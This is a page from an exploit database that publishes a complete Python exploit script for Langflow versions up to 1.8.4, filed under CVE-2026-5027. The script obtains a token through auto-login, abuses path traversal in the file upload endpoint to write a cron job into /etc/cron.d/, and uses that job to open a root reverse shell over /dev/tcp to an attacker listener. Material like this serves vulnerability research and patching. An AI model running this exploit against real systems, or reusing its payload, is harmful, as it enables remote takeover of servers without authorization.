---
title: Langflow  1.8.4 Path Traversal to Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2026110001
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-11-11
fetch_date: 2026-11-12T09:00:48.271570
---

# Langflow  1.8.4 Path Traversal to Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Langflow 1.8.4 Path Traversal to Remote Code Execution** **2026.11.11**  Credit:  **[cardosource](https://cxsecurity.com/author/cardosource/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-5027](https://cxsecurity.com/cveshow/CVE-2026-5027/ "Click to see CVE-2026-5027")**  CWE: **[CWE-22](https://cxsecurity.com/cwe/CWE-22 "Click to see CWE-22")** | |

# Exploit Title: Langflow 1.8.4 - Path Traversal to Remote Code Execution
# Google Dork: N/A
# Date: 2026-07-20
# Exploit Author: cardosource
# Vendor Homepage: https://www.langflow.org/
# Software Link: https://github.com/langflow-ai/langflow
# Version: <= 1.8.4
# Tested on: Docker - Ubuntu 22.04 + Langflow 1.8.4
# CVE: CVE-2026-5027
"""
Langflow <= 1.8.4 - CVE-2026-5027
Path Traversal leading to Remote Code Execution (RCE)
The vulnerability allows an authenticated attacker to abuse a path traversal
in the file upload endpoint to write arbitrary files outside the intended
directory. By writing a cron job under /etc/cron.d/, arbitrary commands can
be executed with root privileges, resulting in Remote Code Execution.
The exploit:
1. Obtains an access token via the auto-login endpoint.
2. Abuses path traversal in the file upload endpoint.
3. Writes a malicious cron job to /etc/cron.d/.
4. Waits for cron to execute the reverse shell payload.
"""
import warnings
import requests
import sys
import time
import re
from typing import Optional, Tuple, Dict, Any
from pathlib import PurePosixPath
def create\_config(
target: str = "http://localhost:9013",
lhost: str = "192.168.1.100",
lport: int = 4444
) -> Dict[str, Any]:
return {
"target": target.rstrip('/'),
"lhost": lhost,
"lport": lport,
"traversal\_depth": 9,
"endpoint": "/api/v2/files",
"auth\_endpoint": "/api/v1/auto\_login"
}
def create\_session() -> requests.Session:
session = requests.Session()
session.verify = False
return session
def authenticate(config: Dict[str, Any], session: requests.Session) -> Optional[str]:
try:
response = session.get(
f"{config['target']}{config['auth\_endpoint']}",
timeout=10
)
if response.status\_code == 200:
return response.json().get("access\_token")
except (requests.RequestException, KeyError, ValueError):
pass
return None
def sanitize\_hostname(host: str) -> str:
return re.sub(r"[^A-Za-z0-9\_-]", "\_", host)
def generate\_timestamp() -> str:
return time.strftime("%Y%m%d%H%M%S")
def build\_cron\_path(lhost: str, lport: int) -> str:
timestamp = generate\_timestamp()
safe\_host = sanitize\_hostname(lhost)
return f"/etc/cron.d/langflow\_{safe\_host}\_{lport}\_{timestamp}\_."
def build\_traversal\_path(remote\_path: str, depth: int = 9) -> str:
path = PurePosixPath(remote\_path)
return "../" \* depth + str(path).lstrip("/")
def build\_cron\_content(lhost: str, lport: int) -> str:
return f"""SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
\* \* \* \* \* root /bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'
"""
def upload\_file(
config: Dict[str, Any],
session: requests.Session,
token: str,
remote\_path: str,
content: bytes
) -> Tuple[bool, Optional[Dict[str, Any]]]:
filename = build\_traversal\_path(remote\_path, config['traversal\_depth'])
headers = {"Authorization": f"Bearer {token}"}
files = {'file': (filename, content, 'application/octet-stream')}
try:
response = session.post(
f"{config['target']}{config['endpoint']}",
headers=headers,
files=files,
timeout=15
)
if response.status\_code in (200, 201):
return True, response.json()
except requests.RequestException:
pass
return False, None
def deploy\_reverse\_shell(
config: Dict[str, Any],
session: requests.Session,
token: str
) -> Tuple[bool, str]:
cron\_path = build\_cron\_path(config['lhost'], config['lport'])
cron\_content = build\_cron\_content(config['lhost'], config['lport'])
success, response\_data = upload\_file(
config, session, token, cron\_path, cron\_content.encode()
)
if success:
return True, cron\_path
return False, cron\_path
def print\_success(lhost: str, lport: int, cron\_path: str) -> None:
print(f"[+] Cron job deployed to {cron\_path}")
print(f"[+] Reverse shell incoming on {lhost}:{lport}")
def print\_failure(message: str = "Exploit failed") -> None:
print(f"[-] {message}")
def print\_token(token: str) -> None:
print(f"[+] Token obtained: {token[:40]}...")
def print\_config(config: Dict[str, Any]) -> None:
print(f"[\*] Target: {config['target']}")
print(f"[\*] Listener: {config['lhost']}:{config['lport']}")
def validate\_config(config: Dict[str, Any]) -> bool:
if not config['target'].startswith(("http://", "https://")):
print\_failure("Target must start with http:// or https://")
return False
if config['lport'] < 1 or config['lport'] > 65535:
print\_failure("Port must be between 1 and 65535")
return False
if config['traversal\_depth'] < 1:
print\_failure("Traversal depth must be at least 1")
return False
return True
def authenticate\_pipeline(config: Dict[str, Any]) -> Tuple[bool, Optional[str], requests.Session]:
session = create\_session()
print("[\*] Authenticating...")
token = authenticate(config, session)
if not token:
session.close()
return False, None, session
print\_token(token)
return True, token, session
def deploy\_pipeline(config: Dict[str, Any], session: requests.Session, token: str) -> bool:
print("[\*] Deploying reverse shell...")
success, cron\_path = deploy\_reverse\_shell(config, session, token)
if success:
print\_success(config['lhost'], config['lport'], cron\_path)
return True
print\_failure()
return False
def exploit(
target: str = "http://localhost:9013",
lhost: str = "192.168.1.38",
lport: int = 4444
) -> None:
config = create\_config(target, lhost, lport)
print\_config(config)
if not validate\_config(config):
sys.exit(1)
success, token, session = authenticate\_pipeline(config)
if not success:
sys.exit(1)
try:
if not deploy\_pipeline(config, session, token):
sys.exit(1)
finally:
session.close()
print("[+] Exploit completed successfully")
if \_\_name\_\_ == "\_\_main\_\_":
exploit()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026110001)

[Tweet](https://twitter.com/share)

...